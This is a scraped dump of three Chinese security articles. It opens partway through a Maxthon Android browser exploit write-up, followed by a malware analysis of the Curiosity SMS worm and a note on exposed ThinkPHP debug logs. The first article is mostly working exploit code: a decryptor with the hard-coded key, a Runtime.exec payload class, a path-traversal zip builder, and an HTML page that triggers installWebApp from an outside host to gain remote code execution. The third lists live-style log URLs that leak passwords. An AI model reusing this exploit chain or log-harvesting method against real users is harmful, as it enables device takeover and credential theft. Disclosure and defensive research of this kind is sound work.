javax.crypto.Cipher;  import javax.crypto.spec.SecretKeySpec;  import java.io.*;public class MaxDexDecrypt {      public static void main(String[] args) throws Exception {        String ciphertextFilename = ""tdata_rqS304"";        String plaintextFilename = ""tdata_rqS304.jar"";        String keyString = ""5f8286ee3424bed2b71f66d996b247b8"";        File ciphertextFile = new File(ciphertextFilename);        File plaintextFile = new File(plaintextFilename);        decryptFile(ciphertextFile, plaintextFile, keyString);    }    public static void decryptFile(File ciphertextFile, File plaintextFile, String keyString) {        BufferedOutputStream v1_5;        Throwable v8;        int v1_1;        FileInputStream v2;        BufferedOutputStream v0_2;        FileOutputStream v2_1;        FileInputStream v3;        FileOutputStream v1 = null;        try {            v3 = new FileInputStream(ciphertextFile);            v2_1 = new FileOutputStream(plaintextFile);            v0_2 = new BufferedOutputStream(((OutputStream)v2_1));            v1_1 = 1024;            byte[] v1_4 = new byte[v1_1];            while(true) {                int v4 = v3.read(v1_4);                if(v4 == -1) {                    break;                }                byte[] v5 = new byte[v4];                System.arraycopy(v1_4, 0, v5, 0, v4);                v0_2.write(decrypt(v5, keyString));            }            v3.close();            v0_2.flush();            v0_2.close();            v2_1.close();            v3.close();            v0_2.close();            v2_1.close();        }        catch(Exception v0_1) {        }    }    public static void junk(int[] arg2, int arg3, int arg4) {        int v0 = arg2[arg3];        arg2[arg3] = arg2[arg4];        arg2[arg4] = v0;    }    public static byte[] decrypt(byte[] ciphertextBytes, String keyString) {        return decrypt(ciphertextBytes, keyString.getBytes());    }    public static byte[] decrypt(byte[] ciphertextBytes, byte[] keyBytes) {        int v1 = 0;        int[] v3 = new int[256];        int v0;        for(v0 = 0; v0 &lt; v3.length; ++v0) {            v3[v0] = v0;        }        v0 = 0;        int v2 = 0;        while(v0 &lt; v3.length) {            v2 = (v2 + v3[v0] + (keyBytes[v0 % keyBytes.length] &amp; 255)) % 256;            junk(v3, v0, v2);            ++v0;        }        byte[] v4 = new byte[ciphertextBytes.length];        v0 = 0;        v2 = 0;        while(v1 &lt; v4.length) {            v0 = (v0 + 1) % 256;            v2 = (v2 + v3[v0]) % 256;            junk(v3, v0, v2);            v4[v1] = ((byte)(v3[(v3[v0] + v3[v2]) % 256] ^ ciphertextBytes[v1]));            ++v1;        }        return v4;    }}解密有效！—— 解密成功，只是个有一些 dex 代码的 JAR 文件—— 现在我们可以反编译代码了利用任意文件写入三 - 远程代码执行这时，所有要点聚在一起，我意识到通过任意文件写入漏洞远程执行代码是可行的。1） 创建我们的 Java 代码然后将它编译至 APK 文件。2） 使用 igexin 的超级 XOR 加密算法加密我们的 APK 文件，使用“5f8286ee3424bed2b71f66d996b247b8” 作为我们的加密密钥。3） 创建一个 zip 文件，用来覆盖浏览器的 tdata_tqS304 文件（加密的 JAR 文件）。4）欺骗受害者浏览一个能触发 installWebApp 方法的恶意页面，这会使受害者的浏览器下载并解压缩我们的zip文件。 此时，受害者的 tdata_rqS304 文件将替换为我们制作的文件。5）下次浏览器再次启动时（可能在移动设备重新启动后），我们的代码将被解密，加载然后执行。广告库从 tdata_rqS304 文件加载 com.igexin.push.extension.distribution.basic.stub.PushExtension 类，像前面说过的，我们要做的是创建一个带有以下类的 APK。package com.igexin.push.extension.distribution.basic.stub;import java.io.BufferedReader;  import java.io.InputStreamReader;import android.util.Log;public class PushExtension {    public PushExtension() {        Log.wtf(""MAX"", ""Java code execution!"");        try {            Runtime runtime = Runtime.getRuntime();            Process process = runtime.exec(""id"");            BufferedReader stdInput = new BufferedReader(new  InputStreamReader(process.getInputStream()));            String s = null;            while ((s = stdInput.readLine()) != null) {                Log.wtf(""MAX"", s);            }        }        catch(Exception e) { }    }}接下来，我们需要加密APK文件。 我们实际上可以重复使用之前开发的解密程序来执行，已经提供了本地加密算法（dec（cipher_text，key）== plaintext / dec（plaintext，key）== cipher_text）。...    public static void main(String[] args) throws Exception {        String ciphertextFilename = ""exploit/MaxJunkExploit.apk"";        String plaintextFilename = ""exploit/tdata_rqS304"";        String keyString = ""5f8286ee3424bed2b71f66d996b247b8"";        File ciphertextFile = new File(ciphertextFilename);        File plaintextFile = new File(plaintextFilename);        decryptFile(ciphertextFile, plaintextFile, keyString);    }...同理，我们使用 Python 代码来构建 zip 文件。import zipfile  import sysif __name__ == ""__main__"":      try:        with open(""tdata_rqS304"", ""r"") as f:            binary = f.read()            zipFile = zipfile.ZipFile(""maxFileWriteToRce9313.zip"", ""a"", zipfile.ZIP_DEFLATED)            zipFile.writestr(""../../../../../data/data/com.mx.browser/files/tdata_rqS304"", binary)            zipFile.close()    except IOError as e:        raise e然后我们制作调用 installWebApp 方法的 HTML 页面。&lt;html&gt;  &lt;body&gt;  &lt;script&gt;  mmbrowser.installWebApp(""http://d3adend.org/test/maxFileWriteToRce9313.zip"");  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;  此时如果受害者使用 Maxthon 浏览器访问恶意页面，那么他们的加密 JAR 文件（tdata_rqS304)将被我们制作的 JAR 文件覆盖。—— 校验 “webapp” 已安装我们的 Java payload 将在下次浏览器重新启动时解密并执行。执行类加载的代码会尝试使用 IPushExtension 接口转换对象，该操作会失败，但是我们的代码在构造函数中已经执行，并且类加载已经代码正常处理该异常，所以浏览器工作正常不会崩溃。—— 执行远程代码完毕漏洞披露流程2/12/16 – 向厂商公开任意文件写入/远程代码执行漏洞。2/14/16 – 向厂商公开登录页 UXSS 漏洞和 SQL 注入漏洞。2/15/16 – 厂商回应说所有问题已修复。提供了本地服务器上的新 APK 的链接。2/15/16 – 要求供应商直接发送修复后的 APK ，或直接在公网服务器上提供访问。2/18/16 – 厂商提供新 APK 的公网链接。2/18/16 – 通知厂商修复程序未正确解决所有问题 (仅解决部分问题)。2/19/16 – 厂商声明他们正在研究。3/8/16 – 询问厂商的状态。3/9/16 – 厂商声明所有问题已修复，但不提供新的 APK 进行审计。5/9/16 – 厂商在 Google Play 上发布了补丁（“bugs fixed”）。5/30/16 – 通知厂商补丁并未正确解决所谓问题（此时只解决了两个问题）。5/31/16 – 厂商表示我的评论正在接受审核（自动回复）。没有后续回应。7/6/16 – 向厂商查询状态，没有回应。11/5/16 – 再一次向厂商查询状态，没有回应。这时厂商已经不再做出响应，而且只有一些问题被修复。旧设备（&lt;4.2）上的原创代码执行漏洞 - 并未修复。厂商标记为“不再修复”。任意文件写入，可以导致任何设备远程代码执行 - 没有修复。登录页 UXSS - 看起来是修复了（一些域名验证，但是没有对输出进行编码）SQL 注入 - 看起来修复了（使用参数化的 SQL 语句）。其中一个补丁试图根据域名限制哪些网页可以使用 installWebApp 方法。@JavascriptInterface public void installWebApp(String arg4) {    URI v0 = URI.create(arg4);    if((v0.getHost().endsWith(""maxthon.com"")) || (v0.getHost().endsWith(""maxthon.cn""))) {        String v0_1 = x.a(arg4);        p.a(arg4, ""/sdcard/webapp/"" + v0_1, null);        y.b(""/sdcard/webapp/"" + v0_1);        d.b().a();        Toast.makeText(this.mContext, ""webapp installed"", 1).show();    }}以前的代码有多个问题，我已多次向厂商指出。1） 从 thisisevilmaxthon.com （以 “maxthon.com”结尾）提供的 JavaScript 仍然可以直接利用任意文件写入漏洞。2） 该 zip 文件仍然可以通过 HTTP 提供，因此内网攻击者可以强制通过 HTTP 从 maxthon.com 下载一个 zip 文件，然后 MiTM（中间人工具）劫持流量，以间接利用任意文件写入漏洞。结论远程 SQL 注入对移动应用是一件事，但是鉴于 SQLite 的限制，提取数据方面可能存在一些问题。移动应用仍在通过 JavaScript 接口暴露有趣的行为，但是我们将不得不花费更多时间逆向目标应用程序以找出安全隐患通过动态类加载进行混淆使用可能会导致意想不到的安全隐患","2016-11-15 13:58:37","移动安全","傲游浏览器漏洞系列（下）- 客户端 SQL 注入和代码执行漏洞","http://nsoad.com/Article/MobileSecurity/20161115/777.html"
"5ccbfb704f2f0a0a7a69c165","我是这个世界的一个和平主义者，我首先收到信息是你们文明的幸运，警告你们：不要回答！不要回答！不要回答！！！” ———《三体》《三体》是国内科幻","Kong","我是这个世界的一个和平主义者，我首先收到信息是你们文明的幸运，警告你们：不要回答！不要回答！不要回答！！！” ———《三体》《三体》是国内科幻小说界里程碑式的作品，多位互联网大佬都是其粉丝，去年其更是荣获科幻小说界的最高奖 “雨果奖”。小说中人类为探索外星文明向宇宙发送电波并收到了三体文明的回复，一旦人类回复该电波，三体将立即定位地球位置并开展后续的侵略行动。不止在小说中，现实生活中也存在很多类似的“钓鱼”短信在人们之间传播，一旦不慎点开了短信中的“钓鱼”链接，链接中附带的病毒将立即入侵手机，给人们的隐私、财产安全带来极大的威胁。在此，安天AVL移动安全和猎豹移动安全实验室提醒大家：在收到附带“钓鱼”链接的短信时，不要点开！不要点开！不要点开！！！近期，安天AVL移动安全和猎豹移动安全实验室就监控到一个群发“钓鱼”短信散布蠕虫病毒的恶意事件，事件中的Curiosity病毒一旦进入手机将立即获取感染手机的联系人信息并群发“钓鱼”短信，短信的内容为“你好，我看到这有你的私密照片，点击链接查看：hxxp://b**.ly/2abgToi”。收件人一旦没忍住好奇心点击了该链接，链接指向的蠕虫病毒将会被下载到用户手机。该病毒利用大家对朋友的信任和好奇心，通过短信进行蠕虫病毒传播，并通过远程控制功能形成僵尸网络。值得注意的是，该病毒的远程控制功能是借助Google的C2DM(Android Cloud to Device Messaging)服务实现。接下来，我们将对该病毒进行详细的行为解析。Curiosity病毒运行流程图详细分析群发“钓鱼”短信并拦截短信Curiosity病毒在运行时会获取用户手机中所有联系人的号码，然后向这些号码发送包含蠕虫病毒下载链接的“钓鱼”短信，以诱导更多的用户去下载。短信的内容有多种语言版本，如下图所示，包含英语、阿拉伯语、西班牙语、葡萄牙语、法语等。我们选取其中一个短信内容翻译成中文为：“你好，我看到这有你的私密照片，点击链接查看hxxp://b**.ly/2abgToi ”。收件人一旦点开短信中的链接，链接指向的蠕虫病毒将下载到用户的手机中。蠕虫病毒伪装程序名为picture，以诱导用户下载安装。同时该病毒会将自身设置为默认的短信应用，完全拦截用户接收到的短信，导致用户无法接收到短信，并将黑名单中号码的短信进行删除。设置自身为默认短信应用：拦截用户接收到的短信：删除黑名单中号码的短信：利用Google推送服务远程控制Curiosity病毒在运行时通过Google的C2DM（Android Cloud to Device Messaging）推送服务向感染手机推送远程控制指令，控制感染手机向指定号码拨打电话、向指令号码发送攻击者自定义的短信、向用户联系人群发自定义短信等恶意行为。C2DM框架是Google官方提供的数据推送工具,允许第三方开发者通过C2DM服务器向用户手机推送少量的数据。 在这里要对Google的C2DM推送流程进行简单的介绍：使用C2DM来进行Push操作，需要一部包含Google服务的安卓手机、C2DM服务器和第三方服务器。如上图所示Curiosity病毒利用C2DM服务进行数据推送的流程：Step1.使用感染用户的Google账号在C2DM服务器注册一个registration ID。Step2.将Google账号和C2DM服务器返回的registration ID发送到攻击者的服务器。Step3.攻击者的服务器将registration ID和要推送的数据以post的方式发送给C2DM服务器上。Step4.C2DM服务器将推送的数据以push的形式推送到该手机上。窃取用户隐私信息Curiosity病毒运行时会窃取大量的用户隐私信息和设备信息并上传到远程服务器，窃取的隐私信息内容如下（日历和浏览器信息在此版本中暂未实现）： 上传用户隐私信息： 此外，该病毒还通过Watchdog对短信、联系人和通话记录进行监控，一旦这些内容发生变化就会将相关信息上传到远程服务器。在上传时该病毒会使用感染用户的Google账号和设备IMEI作为账号密码进行登录，然后进行上传操作。 进行登录操作返回Token：上传通话记录：上传联系人： 上传短信：攻击电话功能Curiosity病毒会在用户拨打电话时自动跳转到Home界面并静默挂断，也会静默挂断指定的号码来电，导致手机电话功能几乎崩溃。拨打电话时跳转到手机的Home界面：静默挂断电话：总结Curiosity病毒运行后获取感染手机的联系人信息，并向联系人群发容易引起好奇心的短信内容,以诱导收件人点击短信中的恶意下载链接，进行蠕虫病毒传播并进一步形成“僵尸网络”，手段极其狡猾。同时该病毒会基于用户自身的Google账户注册C2DM推送模块，通过该模块将远程控制指令推送到用户手机中，后续基于远程指令进行的更深层次的恶意行为。利用第三方平台进行指令推送，手段隐蔽且成本较低，是远程控制病毒的发展趋势。值得注意的是，该病毒并没有包含恶意扣费、推送广告等常见的可获利恶意行为，只有上传用户隐私信息和导致电话功能瘫痪等影响用户正常使用手机的恶意行为。联想到最近国内发生的多起电信诈骗的事件，事件中的受害者被不法者利用隐私信息骗取信任，后续进行诈骗行为。该病毒的恶意开发者后续也有利用窃取的隐私信息对感染用户进行精准电信诈骗的潜在可能，使得感染用户的财产面临极大的安全隐患。安全建议针对Curiosity系列病毒，AVL反病毒引擎集成合作方产品和猎豹专杀工具已经实现全面查杀。安天AVL移动安全团队和猎豹移动安全实验室提醒您：1.谨防电信诈骗，不要随意点击任何未知来源或奇怪短信中的链接。2.请保持良好的上网习惯，不要在非官方网站或者不知名应用市场下载任何应用。3.强烈建议您使用安全软件，并保持定期扫描的良好习惯。","2016-11-09 18:34:50","移动安全","黑产上演《三体》剧情：蠕虫病毒入侵手机群发“钓鱼”短信","http://nsoad.com/Article/MobileSecurity/20161109/731.html"
"5ccbfb704f2f0a0a7a69c166","ThinkPHP在开启DEBUG的情况下会在Runtime目录下生成日志，而且debug很多站都没关的，所以影响应该很大吧我们来看一下ThinkPHP3.2版本生成日志结构：THINKPHP3.2 结构：Appl","Blackhold","ThinkPHP在开启DEBUG的情况下会在Runtime目录下生成日志，而且debug很多站都没关的，所以影响应该很大吧我们来看一下ThinkPHP3.2版本生成日志结构：THINKPHP3.2 结构：Application\Runtime\Logs\Home\16_09_09.logTHINKPHP3.1结构：Runtime\Logs\Home\16_09_09.log可以看到是 ：项目名\Runtime\Logs\Home\年份_月份_日期.log这样的话日志很容易被猜解到，而且日志里面有执行SQL语句的记录，这里我随便找几个tp站测试一下：http://demo.xxxxx.cc/Runtime/Logs/User/16_09_06.log 成功下载，并且找到一个用户的密码成功登录：我们再找一个案例:http://www.xxxxxx.com/Runtime/Logs/Home/16_09_06.log成功登录：onethink官网测试http://www.onethink.cn/Runtime/Logs/16_09_07.log修复办法：删除Runtime/Logs下的所有文件，并将APP_DEBUG设置为false","2016-09-09 19:26:58","Web安全","ThinkPHP使用不当可能造成敏感信息泄露","http://nsoad.com/Article/web/20160909/33ef5aecfb93dff7df3da1330ec212a3.html"
